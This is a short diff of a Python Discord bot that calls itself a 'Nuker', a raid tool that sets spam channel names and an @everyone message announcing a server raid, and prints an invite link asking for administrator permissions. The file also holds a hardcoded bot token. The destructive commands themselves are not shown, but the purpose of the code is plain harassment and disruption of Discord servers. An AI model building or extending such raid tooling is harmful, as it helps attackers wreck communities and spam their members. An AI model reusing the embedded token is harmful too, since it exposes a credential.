@@ -5,7 +5,7 @@ from discord import Permissions
 prefix = ">"
 token = "ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.vpM1V1sZzTaHHLwiiVEKnrilN2Y"
 client = commands.Bot(command_prefix=commands.when_mentioned_or(prefix))
-
+print("Connecting To The Nuker...")
 SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi","I run you","kinda got beamed by Chupapi"]
 SPAM_MESSAGE = ["@everyone CHUPAPI MUNYANYOO?!(SERVER GOT RAIDED, WHAT ASHAME)"]
 
@@ -15,6 +15,7 @@ async def on_ready():
     print(f"username: {client.user.name}")
     print(f"id: {client.user.id}")
     print(f"prefix: '{prefix}'")
+    print(f"invite: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot")
     print('===============================================')
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f">setup | {len(client.guilds)} servers"))
 
